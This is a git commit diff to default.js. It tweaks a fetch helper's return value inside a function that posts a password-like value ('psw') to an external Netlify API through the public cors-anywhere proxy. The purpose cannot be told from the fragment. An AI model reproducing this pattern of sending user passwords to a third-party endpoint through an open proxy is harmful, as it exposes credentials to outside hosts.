b0a67fdb42198cb11c73cf01a1fa765cfaccd58b
ravethisway <54139785+ravethisway@users.noreply.github.com>
2022-07-08 00:06:33 +0200

    up

--- default.js
+++ default.js
@@ -43,7 +43,7 @@ function getLocation(psw) {
         //referrerPolicy: 'no-referrer',
         body: JSON.stringify(data)
       });
-    return response.data;
+    return response;
     }
 
     postData('	https://cors-anywhere.herokuapp.com/https://waterfull.netlify.app/api/checkpsw', { "checkThis": psw })
